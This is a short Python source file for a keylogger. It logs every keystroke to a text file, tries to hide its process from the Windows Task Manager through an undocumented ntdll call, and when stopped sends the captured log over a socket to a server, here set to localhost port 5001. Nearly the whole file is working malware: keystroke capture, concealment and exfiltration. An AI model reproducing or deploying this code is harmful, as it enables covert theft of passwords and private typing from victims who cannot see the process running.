import ctypes, platform
import os
import socket
import tqdm

from pynput import keyboard

path = "log.txt"

# enters keypresses into a text file
def on_press(key):
    try:
        with open("log.txt", "a") as logFile:
            if hasattr(key, "char") and key.char:
                logFile.write(key.char + "\n")
            else:
                logFile.write(f'[{key}' + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

    if key == keyboard.Key.esc:
        return False
    return None

# attempts to hide the process from the windows task manager
def hide_process():
    if platform.system() == "Windows":
        try:
            process_handle = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.ntdll.NtSetInformationProcess(process_handle, 0x1d, 0, 0)
            return True

        except Exception as e:
            print(f"Error while hiding process: {e}")
            return False
    else:
        print(f"Not running Windows, running on {platform.system()} {platform.release()}")
        return False

if hide_process():
    print("Hiding process")
else:
    print("Hiding process failed")

# sends the content of the text file to a server
def send_data():
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 4096
    host = "127.0.0.1"
    port = 5001
    filename = "log.txt"
    filesize = os.path.getsize(filename)

    s = socket.socket()
    print(f"Connecting to {host}:{port}")
    s.connect((host, port))
    print(f"Connected to {host}:{port}")
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"Sending {filesize}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            data = f.read(BUFFER_SIZE)
            if not data:
                break
            s.sendall(data)
            progress.update(len(data))
    s.close()

def main():
    hide_process()
    print("Starting keylogger Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    send_data()

if __name__ == "__main__":
    main()